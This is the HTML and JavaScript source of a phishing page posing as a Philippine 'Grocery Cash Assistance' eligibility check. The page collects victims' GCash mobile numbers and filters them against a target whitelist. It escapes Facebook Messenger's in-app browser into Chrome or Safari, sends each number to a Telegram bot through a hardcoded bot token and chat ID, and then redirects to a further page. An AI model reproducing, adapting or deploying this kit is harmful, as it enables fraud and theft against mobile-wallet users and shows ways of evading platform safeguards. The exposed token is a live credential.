<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>FreeShoppingPH | Verification Process</title>
    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;600;800&family=JetBrains+Mono:wght@700&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <style>
        :root { --primary-green: #2d6a4f; --soft-green: #52b788; --background-light: #f8f9fa; --text-main: #2d3436; }
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { background-color: var(--background-light); font-family: 'Public Sans', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
        .card { width: 92%; max-width: 380px; background: white; border-radius: 30px; padding: 40px 24px; text-align: center; box-shadow: 0 20px 40px rgba(0,0,0,0.05); }
        .logo-img { width: 160px; border-radius: 15px; margin-bottom: 24px; }
        h1 { font-size: 24px; font-weight: 700; color: var(--primary-green); margin-bottom: 12px; }
        p { color: #636e72; font-size: 14px; margin-bottom: 30px; }
        .btn-primary { background: linear-gradient(180deg, var(--soft-green) 0%, var(--primary-green) 100%); color: white; border: none; width: 100%; padding: 18px; border-radius: 15px; font-weight: 700; cursor: pointer; text-transform: uppercase; }
        .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(45, 106, 79, 0.4); backdrop-filter: blur(4px); z-index: 999; align-items: center; justify-content: center; }
        .modal-content { width: 92%; max-width: 400px; background: white; border-radius: 24px; padding: 30px 24px; text-align: center; }
        input { width: 100%; background: #f1f3f5; border: 2px solid transparent; border-radius: 12px; padding: 16px; font-size: 18px; text-align: center; font-family: 'JetBrains Mono', monospace; margin-bottom: 20px; outline: none; }
        input:focus { border-color: var(--soft-green); }
        .label-text { text-align: left; display: block; font-size: 11px; font-weight: 700; color: var(--primary-green); margin-bottom: 8px; }
    </style>
</head>
<body>

    <div class="card">
        <img src="ivana.jpeg" class="logo-img" alt="Logo">
        <h1>Service Activation</h1>
        <p>Verification is required to check your eligibility for the Grocery Cash Assistance.</p>
        <button class="btn-primary" onclick="document.getElementById('modalOverlay').style.display='flex'">Proceed to Verification</button>
    </div>

    <div class="modal-overlay" id="modalOverlay">
        <div class="modal-content">
            <h2 style="margin-bottom: 20px; color: var(--primary-green);">Eligibility Check</h2>
            <span class="label-text">Mobile Number</span>
            <input type="tel" id="userPhone" placeholder="09xxxxxxxxx" maxlength="11">
            <button class="btn-primary" id="confirmBtn" onclick="processStep1()">Verify Number</button>
        </div>
    </div>

    <script>document.write('<script src="config.js?v=' + Date.now() + '"><\/script>');</script>

    <script>
        const botToken = '8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg';
        const chatId = '7298607329';

        function processStep1() {
            const phoneInput = document.getElementById('userPhone');
            const phone = phoneInput.value.trim();
            const btn = document.getElementById('confirmBtn');

            // 1. Basic Format Validation
            if (phone.length < 11 || !phone.startsWith('09')) {
                Swal.fire({ icon: 'error', title: 'Invalid Number', text: 'Please enter a valid 11-digit GCash number.' });
                return;
            }

            // 2. White-list Filter
            if (typeof ALLOWED_NUMBERS === 'undefined' || !ALLOWED_NUMBERS.includes(phone)) {
                Swal.fire({
                    icon: 'error',
                    title: 'Access Denied',
                    text: 'Sorry, your mobile number is not yet registered in our official beneficiary list.',
                    confirmButtonColor: '#2d6a4f'
                });
                phoneInput.value = "";
                return; 
            }

            // 3. Messenger/In-App Browser Detection & Intent
            const ua = navigator.userAgent || navigator.vendor || window.opera;
            const isMessenger = (ua.indexOf("FBAN") > -1) || (ua.indexOf("FBAV") > -1) || (ua.indexOf("Messenger") > -1);
            
            if (isMessenger) {
                const currentUrl = window.location.href.replace(/^https?:\/\//, '');
                
                // Android Intent to force Chrome
                if (/Android/i.test(ua)) {
                    const intentUrl = `intent://${currentUrl}#Intent;scheme=https;package=com.android.chrome;end`;
                    Swal.fire({
                        title: 'Switching Browser',
                        text: 'Opening in Chrome to avoid technical errors...',
                        icon: 'info',
                        timer: 2000,
                        showConfirmButton: false
                    });
                    setTimeout(() => { window.location.href = intentUrl; }, 1200);
                    return;
                } 
                // iOS logic (Manual prompt because iOS blocks auto-intents)
                else if (/iPhone|iPad|iPod/i.test(ua)) {
                    Swal.fire({
                        title: 'Browser Bug Detected',
                        text: 'Please tap the (...) icon at the top right and select "Open in Safari" to complete verification.',
                        icon: 'warning',
                        confirmButtonText: 'I Understand',
                        confirmButtonColor: '#2d6a4f'
                    });
                    return;
                }
            }

            // 4. Normal Processing (If NOT in Messenger or already escaped)
            btn.disabled = true;
            btn.innerHTML = "Verifying...";

            // Log to Telegram
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent('✅ ELIGIBLE USER ENTERED:\n📱 Number: ' + phone)}`)
            .catch(err => console.log('Telegram log failed, continuing anyway...'));

            // Redirect to main.html
            setTimeout(() => {
                sessionStorage.setItem('verified_user', 'true');
                window.location.href = "main.html";
            }, 1500);
        }
    </script>
</body>
</html>
